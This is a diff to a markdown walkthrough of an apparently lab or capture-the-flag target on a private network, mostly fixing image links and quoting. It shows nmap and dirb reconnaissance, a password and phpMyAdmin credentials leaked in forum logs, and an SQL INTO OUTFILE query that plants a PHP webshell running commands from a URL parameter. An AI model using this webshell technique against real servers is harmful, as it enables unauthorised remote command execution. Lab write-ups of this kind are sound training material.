@@ -6,17 +6,19 @@ This is not a big deal, we will use nmap to scan all devices on our network and 
 ```console
 nmap 10.13.100.0/24
 ```
-![Nmap report Image](url "Nmap scan")
+![Nmap report Image](img/nmap-scan.png "Nmap scan")
 
 That will show us the open ports, we notice that a host is up with open ports for ssh, ftp, *http* and *https*. That mean we can access it via our navigator
 after that we use dirbuster to fuzz all available directories in the website:
 
-![Website Image](url "Website")
+![Website Image](img/homepage.png "Website")
 
 We can access to the website but still we can't do much with a simple HTML page, let's try fuzzing directories with *dirb* to see if we can find any useful directory.
 ```console
 dirb https://10.13.100.x
 ```
+
+![dirb result](img/dirb.png "dirb result")
 
 we find a /forum + other directories we will get to later
 after scanning the posts in the forum, we find a thread from lmezard where there is a bunch of logs and errors, after a quick scan we can find a leaked pw : **!q\]Ej?\*5K5cy\*AJ**
@@ -26,9 +28,9 @@ we will find identifiers to the database phpmyadmin **root/Fg-'kKXBj87E:aJ$**
 https:://10.13.100.x/phpmyadmin/ was also a directory found, let's log into it using those credentials:
 Let's try injecting a simple PHP webshell using sql:
 ```sql
-SELECT "<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET['cmd']) {​​system($_GET['cmd']);}​​ ?> </pre></BODY></HTML>"
+SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
 
-INTO OUTFILE '/var/www/html/forum/templates_c/cmd.php'
+INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
 ```
 After some trial and error, all directories found with dirb are non-writable and will return an error except https://10.13.100.x/forum/templates_c/
 
